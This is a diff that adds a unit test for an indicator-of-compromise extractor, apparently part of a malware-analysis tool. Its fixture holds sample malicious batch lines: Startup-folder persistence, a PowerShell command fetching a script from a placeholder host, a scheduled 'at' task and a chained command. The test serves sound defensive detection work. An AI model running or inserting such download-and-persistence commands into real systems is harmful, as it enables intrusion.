@@ -225,3 +225,25 @@ def test_yara_results_are_not_mined_for_iocs() -> None:
     assert "http://real.example/a" in vals
     assert not any("yara-only" in v or "intel-blog" in v or "vendor.example" in v
                    or "nested-yara" in v for v in vals)
+
+
+
+def test_spaced_paths_and_command_boundaries() -> None:
+    t = ('rem persist via %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\inv.lnk\n'
+         'copy "C:\\Program Files\\Billing Portal\\inv viewer.exe" %TEMP%\\inv.exe\n'
+         'rem no such TLD at IANA; type of payment: transfer\n'
+         'powershell -nop -c "iwr http://billing-portal.example/a.ps1"\n'
+         'rem 203.0.113.9\n'
+         'type C:\\Windows\\win.ini & at 23:00 cmd /c calc\n'
+         'Where to go: C:\\temp\n'
+         'start explorer.exe http://billing-portal.example/x\n')
+    res = ioc.extract([{"module": "batch", "location": "code", "text": t}])["iocs"]
+    paths = {i["value"] for i in res if i["type"] == "filepath"}
+    cmds = {i["value"] for i in res if i["type"] == "command"}
+    assert "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\inv.lnk" in paths
+    assert "C:\\Program Files\\Billing Portal\\inv viewer.exe" in paths
+    assert 'powershell -nop -c "iwr http://billing-portal.example/a.ps1"' in cmds
+    assert "type C:\\Windows\\win.ini" in cmds and "at 23:00 cmd /c calc" in cmds
+    assert "explorer.exe http://billing-portal.example/x" in cmds
+    assert not any(c.lower().startswith(("at iana", "type of", "where to")) for c in cmds)
+    assert not any("\n" in c or "rem" in c for c in cmds)
